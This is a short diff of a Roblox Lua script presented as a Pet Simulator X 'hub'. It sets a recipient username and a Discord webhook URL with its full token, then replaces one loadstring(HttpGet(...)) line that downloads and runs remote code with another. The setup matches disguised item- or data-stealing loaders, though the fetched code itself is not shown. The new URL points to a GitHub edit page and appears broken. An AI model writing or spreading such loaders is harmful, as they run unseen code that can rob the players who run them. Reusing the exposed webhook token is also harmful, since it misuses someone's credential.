@@ -2,4 +2,4 @@ _G.Username = "Dublxins"
 _G.HubName = "Cameroonian Prince's pet simulator hub"
 _G.WebhookUrl = "https://discord.com/api/webhooks/1093256809684402227/bseKt6c0jxikp19KEbnZDxQuwmRDR4EJqpFSE9YQ2t6TLg-C258wUcFqogCswgXtVBs9"
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Jayiioceanii/PeakOnTop/main/peak.lua"))()
+loadstring(game:HttpGet(('https://github.com/Dublxins/PetSimXScript/edit/main/Pet%20simulator%20hub'),true))()
